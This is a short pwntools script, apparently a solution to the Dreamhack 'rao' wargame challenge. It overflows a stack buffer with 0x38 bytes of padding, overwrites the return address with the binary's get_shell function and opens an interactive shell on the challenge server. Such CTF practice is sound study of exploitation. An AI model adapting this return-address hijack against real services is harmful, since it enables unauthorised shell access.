#!/usr/bin/python3
#Name: rao.py

from pwn import *

p = remote("host3.dreamhack.games", 13604)

e = ELF("./rao")

payload = b'A' * 0x38
payload += p64(e.symbols['get_shell'])

p.send(payload)

p.interactive()



